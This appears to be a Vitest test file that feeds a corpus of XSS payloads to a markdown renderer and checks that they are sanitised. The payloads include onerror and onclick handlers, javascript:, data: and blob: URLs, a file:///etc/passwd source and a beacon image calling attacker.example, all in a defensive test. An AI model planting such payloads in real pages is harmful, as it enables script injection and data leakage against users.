// XSS corpus for `renderMarkdown`.
//
// Each case asserts that a canonical attack payload is neutralized by the
// marked + DOMPurify pipeline configured in `src/lib/markdown.js`.
//
// The rendered output is a string of HTML; we assert via substring negation
// where safe, and via DOM parsing where structural checks are needed
// (external-image placeholder in particular).

import { describe, it, expect, beforeAll } from 'vitest';
import { renderMarkdown } from '../src/lib/markdown.js';

function parseHtml(html) {
  const doc = new DOMParser().parseFromString(
    `<!doctype html><html><body>${html}</body></html>`,
    'text/html',
  );
  return doc.body;
}

describe('renderMarkdown — XSS corpus', () => {
  // First rendering warms the highlighter; everything after is fast.
  beforeAll(async () => {
    await renderMarkdown('warmup');
  });

  it('strips onerror attribute on <img>', async () => {
    const out = await renderMarkdown('<img src=x onerror=alert(1)>');
    expect(out.toLowerCase()).not.toContain('onerror');
    expect(out.toLowerCase()).not.toContain('alert(1)');
  });

  it('rejects javascript: href in markdown link', async () => {
    const out = await renderMarkdown('[click](javascript:alert(1))');
    // Anchor either has no href, or href is not javascript:.
    expect(out.toLowerCase()).not.toContain('javascript:alert');
    expect(out.toLowerCase()).not.toContain('href="javascript:');
  });

  it('strips <script> entirely', async () => {
    const out = await renderMarkdown('<script>alert(1)</script>');
    expect(out.toLowerCase()).not.toContain('<script');
    expect(out).not.toContain('alert(1)');
  });

  it('strips <iframe>', async () => {
    const out = await renderMarkdown('<iframe src="https://attacker"></iframe>');
    expect(out.toLowerCase()).not.toContain('<iframe');
  });

  it('strips <style>', async () => {
    const out = await renderMarkdown('<style>body{display:none}</style>');
    expect(out.toLowerCase()).not.toContain('<style');
    expect(out).not.toContain('display:none');
  });

  it('rejects data: href on anchor', async () => {
    const out = await renderMarkdown(
      '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    );
    expect(out.toLowerCase()).not.toContain('href="data:');
  });

  it('strips onclick from any element', async () => {
    const out = await renderMarkdown('<p onclick="alert(1)">click</p>');
    expect(out.toLowerCase()).not.toContain('onclick');
    expect(out).not.toContain('alert(1)');
  });

  it('blocks external http image and sets placeholder markers', async () => {
    const out = await renderMarkdown(
      '<img src="http://attacker.example/beacon?user=foo" alt="x">',
    );
    const body = parseHtml(out);
    const img = body.querySelector('img');
    // The img element survives (so the placeholder CSS can style it) but
    // its src is neutralized and the original URL is stashed in data-*.
    expect(img).not.toBeNull();
    expect(img.getAttribute('src')).toBe('');
    expect(img.getAttribute('data-external-src')).toContain(
      'http://attacker.example/beacon',
    );
    expect(img.classList.contains('external-image-blocked')).toBe(true);
  });

  it('blocks external https image the same way', async () => {
    const out = await renderMarkdown(
      '<img src="https://evil.example/pixel.gif">',
    );
    const img = parseHtml(out).querySelector('img');
    expect(img).not.toBeNull();
    expect(img.getAttribute('src')).toBe('');
    expect(img.classList.contains('external-image-blocked')).toBe(true);
  });

  it('strips file:// image src', async () => {
    const out = await renderMarkdown('<img src="file:///etc/passwd">');
    const img = parseHtml(out).querySelector('img');
    if (img) {
      // Either no img element at all (DOMPurify dropped it) or src removed.
      expect(img.getAttribute('src') || '').not.toMatch(/^file:/i);
    }
    expect(out.toLowerCase()).not.toContain('file:///etc/passwd');
  });

  it('strips blob: image src', async () => {
    const out = await renderMarkdown(
      '<img src="blob:https://evil.example/abc">',
    );
    const img = parseHtml(out).querySelector('img');
    if (img) {
      expect(img.getAttribute('src') || '').not.toMatch(/^blob:/i);
    }
    expect(out.toLowerCase()).not.toContain('blob:https://evil.example');
  });

  it('strips data: SVG image src (XSS vector)', async () => {
    const out = await renderMarkdown(
      '<img src="data:image/svg+xml,%3Csvg%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/svg%3E">',
    );
    const img = parseHtml(out).querySelector('img');
    if (img) {
      expect(img.getAttribute('src') || '').not.toMatch(/^data:/i);
    }
    expect(out.toLowerCase()).not.toContain('data:image/svg');
  });

  it('preserves benign GFM table intact', async () => {
    const md = [
      '| a | b |',
      '| - | - |',
      '| 1 | 2 |',
      '| 3 | 4 |',
      '',
    ].join('\n');
    const out = await renderMarkdown(md);
    const body = parseHtml(out);
    expect(body.querySelector('table')).not.toBeNull();
    expect(body.querySelectorAll('th').length).toBe(2);
    expect(body.querySelectorAll('td').length).toBe(4);
  });

  it('preserves benign fenced code block intact', async () => {
    const md = [
      '```javascript',
      'const x = 1;',
      'console.log(x);',
      '```',
      '',
    ].join('\n');
    const out = await renderMarkdown(md);
    // Shiki wraps in <pre><code>...</code></pre> with per-line spans.
    expect(out).toContain('<pre');
    expect(out).toContain('<code');
    expect(out).toContain('const');
    expect(out).toContain('console');
    // Sanity: no <script>, no inline style.
    expect(out.toLowerCase()).not.toContain('<script');
  });

  it('preserves nested table + code fence together', async () => {
    const md = [
      '| lang | sample |',
      '| - | - |',
      '| js | `console.log(1)` |',
      '',
      '```python',
      'def foo():',
      '    return 42',
      '```',
      '',
    ].join('\n');
    const out = await renderMarkdown(md);
    const body = parseHtml(out);
    expect(body.querySelector('table')).not.toBeNull();
    expect(body.querySelector('pre')).not.toBeNull();
  });
});
